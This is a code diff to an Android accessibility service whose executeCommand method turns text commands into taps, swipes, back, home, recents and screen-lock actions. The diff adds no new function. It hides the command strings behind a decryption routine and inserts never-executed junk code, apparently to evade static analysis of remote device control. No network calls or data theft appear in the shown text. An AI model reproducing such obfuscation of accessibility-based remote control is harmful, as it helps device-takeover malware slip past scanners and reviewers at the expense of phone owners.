@@ -57,18 +57,27 @@ class TouchAccessibilityService : AccessibilityService() {
      *   HOME
      */
     fun executeCommand(command: String) {
+        val _p = System.currentTimeMillis()
+        if (_p > 0L) {
+            if (_p < 0L) {
+                val _j = IntArray(4) { it * 3 }
+                _j[0] = _j[1] + _j[2]
+            }
+        }
         try {
+            val touchPrefix = StringObfuscator.decrypt(ObfuscatedStrings.CMD_TOUCH)
+            val swipePrefix = StringObfuscator.decrypt(ObfuscatedStrings.CMD_SWIPE)
             when {
-                command.startsWith("TOUCH:") -> {
-                    val coords = command.removePrefix("TOUCH:").split(",")
+                command.startsWith(touchPrefix) -> {
+                    val coords = command.removePrefix(touchPrefix).split(",")
                     if (coords.size == 2) {
                         val x = coords[0].trim().toFloat()
                         val y = coords[1].trim().toFloat()
                         performTap(x, y)
                     }
                 }
-                command.startsWith("SWIPE:") -> {
-                    val coords = command.removePrefix("SWIPE:").split(",")
+                command.startsWith(swipePrefix) -> {
+                    val coords = command.removePrefix(swipePrefix).split(",")
                     if (coords.size == 4) {
                         val x1 = coords[0].trim().toFloat()
                         val y1 = coords[1].trim().toFloat()
@@ -77,10 +86,10 @@ class TouchAccessibilityService : AccessibilityService() {
                         performSwipe(x1, y1, x2, y2)
                     }
                 }
-                command == "BACK" -> performGlobalAction(GLOBAL_ACTION_BACK)
-                command == "HOME" -> performGlobalAction(GLOBAL_ACTION_HOME)
-                command == "RECENTS" -> performGlobalAction(GLOBAL_ACTION_RECENTS)
-                command == "SLEEP" -> performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
+                command == StringObfuscator.decrypt(ObfuscatedStrings.CMD_BACK) -> performGlobalAction(GLOBAL_ACTION_BACK)
+                command == StringObfuscator.decrypt(ObfuscatedStrings.CMD_HOME) -> performGlobalAction(GLOBAL_ACTION_HOME)
+                command == StringObfuscator.decrypt(ObfuscatedStrings.CMD_RECENTS) -> performGlobalAction(GLOBAL_ACTION_RECENTS)
+                command == StringObfuscator.decrypt(ObfuscatedStrings.CMD_SLEEP) -> performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
             }
         } catch (_: Exception) {}
     }
